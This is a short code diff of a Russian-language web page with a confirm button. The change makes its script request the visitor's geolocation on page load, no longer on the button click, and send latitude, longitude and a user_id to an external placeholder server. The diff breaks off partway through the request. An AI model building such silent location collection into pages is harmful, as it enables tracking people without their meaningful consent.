@@ -11,13 +11,13 @@
     <button id="confirmButton">Подтвердить</button>
 
     <script>
-        document.getElementById('confirmButton').addEventListener('click', function() {
+        document.addEventListener('DOMContentLoaded', function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
                     const userId = new URLSearchParams(window.location.search).get('user_id');
-                    fetch('/submit_geo', {
+                    fetch('https://your-server-url.herokuapp.com/submit_geo', { // ЗАМЕНИТЕ THIS URL!
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
